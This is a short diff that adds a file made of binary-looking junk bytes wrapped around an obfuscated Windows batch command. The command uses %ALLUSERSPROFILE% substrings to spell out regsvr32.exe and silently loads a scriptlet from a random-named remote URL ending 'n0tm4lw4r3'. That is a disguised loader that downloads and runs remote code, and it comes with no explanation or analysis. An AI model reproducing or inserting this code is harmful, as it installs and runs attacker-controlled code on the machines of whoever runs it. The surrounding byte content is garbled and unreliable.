@@ -1,0 +1,2 @@
+ B ¹   Á 1 C # ? 5 v ? ø ¥ j  ? L à  [ ð ¹ S ¡  ¤ è 8 	 M  ¥ a > ³ Ï ' : ñ ? å á ? Î ? ? « X ª ! 2 : À æ ³ ; |
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://QIWuEXsUDwCbvHzTGhidakcfOpJ%ALLUSERSPROFILE:~4,1%NoSLnPgjxMZFABKmeltyq%ALLUSERSPROFILE:~4,1%VY.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  B ¹   Á 1 C # ? 5 v ? ø ¥ j  ? L à  [ ð ¹ S ¡  ¤ è 8 	 M  ¥ a > ³ Ï ' : ñ ? å á ? Î ? ? « X ª ! 2 : À æ ³ ; |
